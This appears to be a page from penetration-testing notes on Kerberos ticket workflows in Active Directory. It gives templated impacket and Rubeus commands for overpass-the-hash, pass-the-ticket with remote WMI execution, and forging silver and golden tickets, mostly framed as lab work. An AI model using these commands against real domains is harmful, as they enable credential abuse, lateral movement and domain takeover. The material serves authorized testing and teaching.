---
title: Kerberos ticket workflows
order: 5
tags: [ad, kerberos, impacket, rubeus, tickets, lateral-movement]
---

Use the [roasting page](active-directory/kerberos) for offline password material.
A TGT, a service ticket, an NT hash and a NetNTLM response are different inputs.
Record the ticket principal, realm, SPN, expiry and source. Resolve the actual
service hostname and check [time](active-directory/kerberos#kerberos-dns-or-clock-failure).

## Obtain a TGT with a password

On **Kali**, request a TGT using a confirmed domain password.

```bash
impacket-getTGT -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}'
export KRB5CCNAME='{{TICKET_PATH}}'
klist -c "$KRB5CCNAME"
```

Set `TICKET_PATH` to the cache filename reported by the request. Verify the client
principal and expiry. Ticket acquisition does not grant new group membership.
[Impacket getTGT](https://github.com/fortra/impacket/blob/master/examples/getTGT.py).

## Overpass-the-Hash

On **Kali**, exchange a verified NT hash for a TGT. This requires an account and
KDC that allow RC4; an AES key is a different input and uses `-aesKey`.

```bash
impacket-getTGT -dc-ip '{{DC}}' -hashes ':{{NT_HASH}}' '{{DOMAIN}}/{{USER}}'
```

For a recovered AES key, choose this alternative instead:

```bash
impacket-getTGT -dc-ip '{{DC}}' -aesKey '{{AES_KEY}}' '{{DOMAIN}}/{{USER}}'
```

Set `KRB5CCNAME` to the emitted cache and inspect it with `klist`. A rejected
encryption type is not proof the credential is wrong. [getTGT options](https://github.com/fortra/impacket/blob/master/examples/getTGT.py).

## Pass-the-ticket from Kali

On **Kali**, use an existing ccache for its authorized principal. `TARGET_FQDN`
must match the intended service identity and resolve through the active route.

```bash
export KRB5CCNAME='{{TICKET_PATH}}'
klist -c "$KRB5CCNAME"
impacket-wmiexec -k -no-pass -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}@{{TARGET_FQDN}}' 'whoami'
```

WMI execution still requires target administrator rights and reachable RPC.
An authentication failure differs from authorization failure.
[wmiexec Kerberos options](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py).

## Ticket format conversion

On **Kali**, convert between Windows kirbi and MIT ccache formats as required by
the receiving tool. Conversion changes the container, not the identity or rights.

```bash
impacket-ticketConverter '{{INPUT_TICKET}}' '{{OUTPUT_TICKET}}'
```

Check the resulting type and principal before reuse. [ticketConverter](https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py).

## Windows ticket inspection and reuse

On the **Windows foothold**, inspect the current logon session before importing a
ticket. Stage a reviewed Rubeus build matching the target runtime.

```powershell
klist
.\Rubeus.exe describe /ticket:'{{KIRBI_PATH}}'
.\Rubeus.exe ptt /ticket:'{{KIRBI_PATH}}'
klist
```

The imported ticket applies to that logon session. Check the service and identity
with the smallest intended operation. [Rubeus ptt and describe](https://github.com/GhostPack/Rubeus).

## Silver tickets

In a **controlled AD lab**, forge a service ticket only after obtaining the key of
the exact account running that SPN, the domain SID and the intended user RID.
Choose the actual `SPN`, `TICKET_USER`, `USER_RID` and `GROUP_RIDS`; do not rely on
the tool's privileged defaults. This is service-specific, not a domain TGT.

```bash
impacket-ticketer -nthash '{{SERVICE_NT_HASH}}' -domain-sid '{{DOMAIN_SID}}' -domain '{{DOMAIN}}' -spn '{{SPN}}' -user-id '{{USER_RID}}' -groups '{{GROUP_RIDS}}' '{{TICKET_USER}}'
```

Use the reported cache with the matching service. Modern PAC validation, key
rotation, service account selection and server patch state can reject a forged
ticket. Record the resulting service identity instead of treating file creation
as success. [ticketer](https://github.com/fortra/impacket/blob/master/examples/ticketer.py).

## Golden tickets

In a **controlled AD lab**, this needs the domain's KRBTGT key, domain SID and a
valid intended identity/RID. A local administrator hash is insufficient. Explicitly
choose group RIDs and verify current tool/PAC compatibility.

```bash
impacket-ticketer -aesKey '{{KRBTGT_AES_KEY}}' -domain-sid '{{DOMAIN_SID}}' -domain '{{DOMAIN}}' -user-id '{{USER_RID}}' -groups '{{GROUP_RIDS}}' '{{TICKET_USER}}'
```

Select the reported cache, inspect its principal and test the intended service.
Ticket forgery does not prove every target accepts it. [ticketer source](https://github.com/fortra/impacket/blob/master/examples/ticketer.py).

## Ticket cleanup and failure recovery

On **Kali**, stop using the cache when the task is finished:

```bash
unset KRB5CCNAME
```

On **Windows**, purge tickets only from the logon session used for the lab:

```cmd
klist purge
```

Record the exact error, principal, SPN, encryption type, expiry, DNS and clock
before requesting another ticket. Remove only lab-created cache files after
preserving required evidence. Local deletion does not revoke an issued ticket.
[Microsoft klist](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/klist).
